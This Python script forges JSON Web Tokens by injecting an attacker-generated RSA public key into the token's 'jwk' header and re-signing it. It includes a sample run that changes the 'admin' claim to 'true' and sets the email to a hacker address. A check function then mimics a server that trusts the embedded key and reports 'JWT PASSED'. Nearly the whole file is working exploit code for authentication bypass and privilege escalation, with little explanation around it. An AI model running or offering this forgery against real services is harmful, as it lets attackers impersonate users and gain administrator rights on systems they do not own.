from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from Crypto.PublicKey import RSA
import struct
import base64
from jwcrypto import jwk
import json
import jwt
import struct
import base64
import argparse
import fileinput
import sys
import six
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers



########################################### [ from pem to jwk helpers ] #################################################

def long2intarr(long_int):
    _bytes = []
    while long_int:
        long_int, r = divmod(long_int, 256)
        _bytes.insert(0, r)
    return _bytes


def long_to_base64(n):
    bys = long2intarr(n)
    data = struct.pack('%sB' % len(bys), *bys)
    if not len(data):
        data = '\x00'
    s = base64.urlsafe_b64encode(data).rstrip(b'=')
    return s.decode("ascii")


def spoof_jwt(orignal_jwt_token,values_to_changes):
   
    #1) GENERATE RSA KEY PAIRS 
    key = RSA.generate(2048)
    privkey=key.export_key('PEM')
    pubkey=key.publickey().export_key("PEM")

   #2) parse orginal jwt_token
    org_parts = orignal_jwt_token.split('.')
    header_spoofed = json.loads(base64.urlsafe_b64decode(org_parts[0]+'=='))
    body = json.loads(base64.urlsafe_b64decode(org_parts[1]+'=='))
    signature= base64.urlsafe_b64decode(org_parts[2]+'==')
   
    #3) generate kid 
    jwk_kid = jwk.JWK.from_pem(pubkey)

    #4) get e and n from generated public key
    public_key = serialization.load_pem_public_key(pubkey,backend=default_backend())
    public_numbers = public_key.public_numbers()
    #5) update jwt by new values [spoofing]
    print(values_to_changes)
    for key in values_to_changes:
        print(key)
        body[key]=values_to_changes[key]


    header_spoofed["kid"] =jwk_kid.kid
    jwk_obj_spoof = header_spoofed['jwk']
    is_arr = isinstance(jwk_obj_spoof, (list)) # check if jwk is arr or just one object
    if is_arr == True:
        jwk_arr_index_0_spoof  = jwk_obj_spoof[0]
        jwk_arr_index_0_spoof["n"]   = long_to_base64(public_numbers.n)
        jwk_arr_index_0_spoof["e"]   = long_to_base64(public_numbers.e)
        jwk_arr_index_0_spoof['kid'] = jwk_kid.kid
        del header_spoofed['jwk']
        header_spoofed['jwk']=jwk_arr_index_0_spoof

    elif is_arr == False:
        jwk_obj_spoof["n"]   = long_to_base64(public_numbers.n)
        jwk_obj_spoof["e"]   = long_to_base64(public_numbers.e)
        jwk_obj_spoof['kid'] = jwk_kid.kid
        header_spoofed.update({'jwk':jwk_obj_spoof})
    #6) generate JWT    #######
    jwt_token = jwt.encode(body, key=privkey,headers=header_spoofed,algorithm='RS256')
    return jwt_token
 



########################################### [ from JWK to PEM helpers ] #################################################
def intarr2long(arr):
    return int(''.join(["%02x" % byte for byte in arr]), 16)


def base64_to_long(data):
    if isinstance(data, six.text_type):
        data = data.encode("ascii")

    # urlsafe_b64decode will happily convert b64encoded data
    _d = base64.urlsafe_b64decode(bytes(data) + b'==')
    return intarr2long(struct.unpack('%sB' % len(_d), _d))


def jwt_verify(spoofed_jwt):
    #1) parse jwt token
    parts = spoofed_jwt.split('.')
    header = json.loads(base64.urlsafe_b64decode(parts[0]+'=='))
    body = json.loads(base64.urlsafe_b64decode(parts[1]+'=='))
    signature= base64.urlsafe_b64decode(parts[2]+'==')
    jwk_object = header['jwk']
    audd = body['aud'] # used for decode
    #2) genereate publickey in pem format  from e & n
    exponent = base64_to_long(jwk_object['e'])
    modulus = base64_to_long(jwk_object['n'])
    numbers = RSAPublicNumbers(exponent, modulus)
    public_key = numbers.public_key(backend=default_backend())
    pem = public_key.public_bytes(encoding=serialization.Encoding.PEM,format=serialization.PublicFormat.SubjectPublicKeyInfo)
    #3) Verify Jwt
    try:
        payload = jwt.decode(spoofed_jwt, pem,audience=audd, algorithms=['RS256'])
        return payload
    except :
        pass
    


dict_values = {"admin":"true","email":"hacker@1337.co"}
jwt_orginal= "eyJraWQiOiI5MmM1YTU1MS0yNjFlLTQ5OTktOGQyMy0wMjM1YTg2NTM1NjEiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsImtpZCI6IjkyYzVhNTUxLTI2MWUtNDk5OS04ZDIzLTAyMzVhODY1MzU2MSIsIm4iOiI2dnNKVzdXQ1NfTnlXd0lBWkthYXNZMVVTa1lmdEdXOXlYeFhXWFlmcjZ3YnZXMDNpRkRaNDZaN09VS2hPZ0lVWGYzUzVaVGF3NVY2WXdFNl8xTVJqUmhBdURlNmJvcFdtMzRIazVnbTFSSEdSWEIzTFJwU3UwTWlkTGxwTkh5ZXFSekRHdDZDVTFhMWR0ZExkVTB0aThqeGNfNlJBdlpUTWJjdVZQaGU4d1o5LWNYME9yZGlzZXF3bEVvZnNWdndEODZDd0g2TENXOF9RVUZmRXZZSzRXdm55XzJzc0FfbnMyMkpaLTZGdXpTLVNmTFFrUWlORXVhMWNnMVBaa1RHd09mVlZ0c1Y0NVRaOGpRYnF5dGc3T2p4VDBxU1pXWEZQamVCQTVNQ3o3MzQyWXlFSjlxbmZock9WTXZ6OEZjdERuaktiTTMzLWplTlBwcHM1dVlxSHcifX0.eyJpc3MiOiJodHRwczovL3NlcnZpY2VBLmVudjo4MDgwIiwiYXVkIjoiYWNjb3VudCIsImlkIjoiNTAxYTFiZjQtYjUyMy00OTNjLWI0NTctYWVmOTM1YTI0MWJhIiwic2NvcGUiOiJwcm9maWxlIiwibmFtZSI6IkJvYiBNYXJsZXkiLCJlbWFpbCI6ImJvYi5tYXJsZXlAaGFja3RyaWNrLmNvbSIsImFkbWluIjoiZmFsc2UiLCJyYW5kIjoiMzgifQ.d18LyHFFtBO9gxiwtc3A_M77kc1u7E8S9QuD5fE8haG0F_b9NvbSP83a5p0gcrIOebb0hHH1Wk-4L6mqj2QC9bDbKIVvx2bmWW8kVyGmMRDs9ccn8PIfT1T3Gsgi-9Smqmf196MHBV5BxGsGFo8ah8o6RP8NKsmuLZmVNFg0bbcs81ndR2hwYzZBeuUQxZfCedqsoQkAie9zFjWu92gMsDqlzM-KdeUi6OyQn3l-iD2N0pQuqImhHq8P_pAHsETgQ6RnugylkPsKMDs0cotaun8cBrItFIKGcrwRbpGqf75Golv10BO0q1xu8pAWW7LEsZ3x7xxfz0lW0ZBVbfTuXw"
spoofed_jwt = spoof_jwt(jwt_orginal,dict_values)
print(spoofed_jwt)
if (jwt_verify(spoofed_jwt)):
    print("JWT PASSED !")
else:
    print("JWT FAILED TO PASS !")

